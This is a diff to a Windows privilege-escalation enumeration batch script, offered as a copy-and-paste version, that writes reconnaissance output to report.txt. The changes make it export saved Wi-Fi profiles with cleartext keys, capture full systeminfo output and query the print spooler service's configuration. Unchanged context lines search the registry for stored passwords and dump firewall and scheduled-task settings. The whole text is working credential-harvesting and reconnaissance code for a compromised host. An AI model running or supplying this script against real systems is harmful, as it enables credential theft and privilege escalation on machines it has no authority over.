@@ -3,7 +3,7 @@ echo Windows Privilege Escalation Report - Copy and Paste Version (No file uploa
  timeout 1
  net config Workstation  >> report.txt
  timeout 1
- systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
+ systeminfo >> report.txt
  timeout 1
  hostname >> report.txt
  timeout 1
@@ -20,6 +20,10 @@ echo Windows Privilege Escalation Report - Copy and Paste Version (No file uploa
  netsh firewall show state >> report.txt	
  timeout 1
  netsh firewall show config >> report.txt
+ timeout 1
+ netsh wlan export profile key=clear
+ timeout 1
+ echo exported wlan profiles to "Wi-Fi-<BSSID_name>.xml
  timeout 1
  schtasks /query /fo LIST /v >> report.txt
  timeout 1
@@ -40,6 +44,8 @@ echo Windows Privilege Escalation Report - Copy and Paste Version (No file uploa
  reg query HKLM /f password /t REG_SZ /s >> report.txt
  timeout 1
  reg query HKCU /f password /t REG_SZ /s >> report.txt 
+ timeout 1
+ sc qc Spooler >> report.txt
  timeout 1
  dir "C:\"
  timeout 1
